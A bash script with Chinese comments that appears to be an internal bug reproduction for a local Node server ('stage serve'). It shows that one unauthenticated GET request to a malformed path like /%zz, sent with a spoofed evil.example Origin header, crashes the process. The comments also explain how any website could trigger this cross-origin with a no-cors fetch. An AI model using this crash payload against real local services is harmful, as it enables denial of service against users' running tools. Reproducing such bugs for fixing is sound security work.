#!/usr/bin/env bash
# 复现（乙·P1）：未鉴权、跨源、单请求打垮 stage serve。
# 根因 serve.mjs:240 decodeURIComponent(url.pathname) 在 try/catch 之外——GET /% 抛 URIError，
# async handler 里的同步抛 = 未处理 rejection → Node 进程崩。GET 路径无 Origin/鉴权闸，故任意网站
# 一发 no-cors fetch('http://127.0.0.1:8942/%') 即打垮本地 serve（live 模式还会遗留 cli live 子进程）。
#
# 用法: bash repro/final-乙/serve_dos_malformed_percent.sh
# 期望: 请求前 serve 存活；GET /% 后 serve 已死（后续请求 HTTP=000）。退出码 0 = 复现成功（确有 DoS）。
set -u
PORT=8949
cd "$(dirname "$0")/../.." || exit 2

node stage/serve.mjs "$PORT" --replay-only >/tmp/serve-dos.log 2>&1 &
SPID=$!
sleep 1

if ! ps -p "$SPID" >/dev/null 2>&1; then echo "serve 未起，弃"; exit 2; fi
echo "serve 存活 PID=$SPID"

# 跨源姿态：带 Origin: evil —— GET 路径在崩溃点之前根本不查 Origin。
# 载荷必须是**真畸形**的 %-序列：%25 是合法编码(解成 %)不触发；用 %zz（zz 非十六进制）才让
# decodeURIComponent 抛 URIError。--path-as-is -g 令 curl 原样送 "/%zz" 不代为编码/globbing。
code=$(curl -s -m 3 --path-as-is -g -H 'Origin: http://evil.example' -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/%zz" 2>/dev/null || true)
echo "跨源 GET /%zz → HTTP=${code:-000}（000=连接被切/崩）"

sleep 0.4
if ps -p "$SPID" >/dev/null 2>&1; then
  echo "✗ 未复现：serve 仍存活"; kill "$SPID" 2>/dev/null; exit 1
else
  echo "✓ 复现：单个未鉴权 GET /% 打垮整个 serve 进程"
  echo "--- serve 崩溃栈 ---"; tail -8 /tmp/serve-dos.log
  exit 0
fi
